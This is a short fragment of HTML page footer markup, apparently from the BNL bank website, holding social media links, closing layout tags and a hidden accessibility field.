target="_blank" title="Twitter "href="#ttps://twitter.com/bnlpeople"><div class="icon icon-twitter"></div></a>		<a target="_blank" title="Youtube "href="#ttps://www.youtube.com/user/BNLCHANNEL"><div class="icon icon-youtube"></div></a>		<a target="_blank" title="Social Wall "href="#ttp://socialwall.bnl.it/"><div class="icon icon-social-wall"></div></a>	</div>	</div></div>
</div><!--content stop-->
</div>
</div>
</div>
</div>
<div class="ls-row-clr"></div>
</div>
</div>
</div>
</div>
<div class="ls-row-clr"></div>
</div>
</div>
</div><!--sf:end[div:sf-master]--></div><!--ls:end[body]-->

<input type="hidden" id="isNonVedente" name="isNonVedente" value="false"></body></html>